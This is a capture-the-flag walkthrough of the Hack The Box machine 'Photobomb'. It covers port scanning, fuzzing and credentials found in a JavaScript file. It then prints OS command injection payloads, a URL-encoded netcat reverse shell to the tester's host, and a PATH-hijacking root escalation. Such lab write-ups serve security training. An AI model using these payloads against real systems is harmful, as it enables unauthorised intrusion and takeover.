# Photobomb

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Topics** | Linux Path Environment Variable Hijacking, Command OS Injection |

---

## 📁 Folder Structure

- [`content/`](content/) — screenshots and inline references used in the write-up
- [`nmap/`](nmap/) — raw nmap output files
- [`exploit/`](exploit/) — exploit scripts, binaries, payloads, and other tools used

---

# Enumeration

### Nmap

```bash
sudo nmap -sS -p- --open --min-rate 5000 -Pn -n -vvv 10.129.245.130 -oN AllPorts
```

```bash
nmap -p 22,80 -sCV -Pn -n -vvv 10.129.245.130 -oN FullScan
```

![Untitled](content/Untitled.png)

![Untitled](content/Untitled%201.png)

Found the Virtual Host Domain:

```bash
http://photobomb.htb/
```

### Web Fuzzing

```bash
wfuzz -c -t 200 --hc=404 -f wfuzz-scan,raw -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://photobomb.htb/FUZZ
```

Found a Potential access with Dirbuster:

![Untitled](content/Untitled%202.png)

```bash
http://photobomb.htb/photobomb.js
```

After checking the file, it looks like to contain some credentials to access:

![Untitled](content/Untitled%203.png)

# Initial Access

Once we have found the file <`photobomb.js`> we will see some credentials to access another resource identified as <`printer`>.

Link:

```bash
http://pH0t0:b0Mb!@photobomb.htb/printer
```

If we open that link, it will take us to the following portal:

![Untitled](content/Untitled%204.png)

At the bottom we can see the following options: 

![Untitled](content/Untitled%205.png)

As we can see, this portal looks like a printer manager to download photos from the server and later print them. 

From the options we have 2 types of Files: PNG and JPG

Also we can see multiple sizes that can be selected to download the photo. 

Let’s try to analyze one of the requests for download using Burpsuite:

Open Burpsuite and select Proxy:

![Untitled](content/Untitled%206.png)

From the browser, select the proxy Burpsuite to intercept the traffic:

![Untitled](content/Untitled%207.png)

Finally, click on any random photo and then click on “DOWNLOAD PHOTO TO PRINT”

We will see the request being intercepted in Burpsuite:

![Untitled](content/Untitled%208.png)

From the request we can see 3 parameters being passed to the server. 

```bash
photo=      --> Looks like that it specifies the file in question
filetype=   --> Specifies the format, we already saw that it could be png or jpg
dimensions= --> Specifies the size of the photo
```

Let’s try to add some OS Injections in those parameters, for this task, we will use Intruder fuction in Burpsuite. 
Right click and select <Send to Intruder>:

![Untitled](content/Untitled%209.png)

Second, start a HTTP Server in kali using Python:

![Untitled](content/Untitled%2010.png)

Finally, proceed to test the parameters, for this, we will concatenate a `wget` request that points to our http kali server. 

Command: `wget%20http%3A%2F%2F10.10.16.7`

> Note: we have to URL encode the command before adding it into the request.
> 

#1- Using the parameter `photo`

```bash
photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg;wget%20http%3A%2F%2F10.10.16.7&filetype=jpg&dimensions=3000x2000
```

Our request should look like this: 

![Untitled](content/Untitled%2011.png)

Click on Send request. 

However, we did not get any response or request to our HTTP Server. Also we can see that server responded with a 500 error. 

![Untitled](content/Untitled%2012.png)

#2- Using the parameter `filetype`. 

```bash
photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg;&filetype=jpg;wget%20http%3A%2F%2F10.10.16.7&dimensions=3000x2000
```

Our request should look like this: 

![Untitled](content/Untitled%2013.png)

Click on Send request.

Success! This time we received a HTTP Request to out Kali Server. 

![Untitled](content/Untitled%2014.png)

Note: Even though the server responded with a 500 error, this confirms that the command was successfully executed. 

![Untitled](content/Untitled%2015.png)

Since this parameter is vulnerable to OS Command Injection, let’s try to execute a reverse shell.

Reverse shell code (URL Encoded): 

```bash
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.16.7%204443%20%3E%2Ftmp%2Ff
```

> Generated from https://www.revshells.com/
> 

Add it to the request in Burpsuite:

![Untitled](content/Untitled%2016.png)

Click Send request:

We should be able to receive the reverse shell: 

![Untitled](content/Untitled%2017.png)

# Privilege Escalation

First, let's try using **`sudo -l` to verify any special privilege.** 

![Untitled](content/Untitled%2018.png)

Nice, we can see there is **`cleanup.sh`** script which we can run with **`sudo`** privilege without passing password.

Also, from the content of the script, we can see that is straight forward, it's just taking the log file and move their content into **`photobomb.log.old`** and then use truncate to clear **`photobomb.log`** to 0 byte.

Howeve, there is something interesting, we can see that some commands are not using **`absolute path`** like `cd` or `find` .

From this, we can take advantage of that and attempt a **`traverse the path attack`** of those **`binaries`.**

We just need to add **`/bin/bash`** in a file called `cd` (like the command), give read, write, execute permission and saved it on the path `/tmp`

![Untitled](content/Untitled%2019.png)

Now just run the `/opt/**cleanup.sh`** script with **`sudo`** permission, however, we need to pass the path `/tmp` as a variable of `PATH`, so, the system is forced to execute the commands from `/tmp`

Command shoud look like this:

```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh 
```

We should now have a `root` shell:

![Untitled](content/Untitled%2020.png)

[Owned Photobomb from Hack The Box!](https://www.hackthebox.com/achievement/machine/906667/500)